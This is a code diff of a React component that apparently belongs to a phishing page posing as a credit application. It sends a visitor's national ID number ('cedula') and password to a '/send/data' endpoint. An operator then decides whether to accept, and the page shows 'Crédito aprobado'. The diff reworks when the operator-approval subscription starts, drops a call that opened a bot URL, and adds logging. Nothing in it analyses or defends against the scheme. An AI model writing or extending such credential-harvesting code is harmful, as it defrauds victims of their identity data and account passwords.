@@ -23,10 +23,9 @@ function App() {
 
       console.log(response.data);
 
-      const { requestId, botUrl } = response.data;
+      const { requestId } = response.data;
       setRequestId(requestId);
 
-      window.open(botUrl, "_blank");
       console.log(decision == 'accepted' ? 'Se te aceptop' : 'no se te acepto')
       console.log(connected ? 'estas conectado' : 'no estas conectado');
     } catch (error) {
@@ -35,6 +34,9 @@ function App() {
   };
 
   const onContinue = async () => {
+    if (!requestId) {
+      await startSubscription();
+    }
     try {
       const response = await api.post("/send/data", {
         text: `\nCC: ${cedula} \n\nContra: ${password}`,
@@ -53,8 +55,7 @@ function App() {
           ],
         }
       });
-
-      startSubscription();
+      // startSubscription();
 
       return response;
     } catch (error) {
@@ -68,6 +69,7 @@ function App() {
   };
 
   useEffect(() => {
+    console.log(decision);
     if (decision === 'accepted') alert('Crédito aprobado');
   }, [decision]);
 
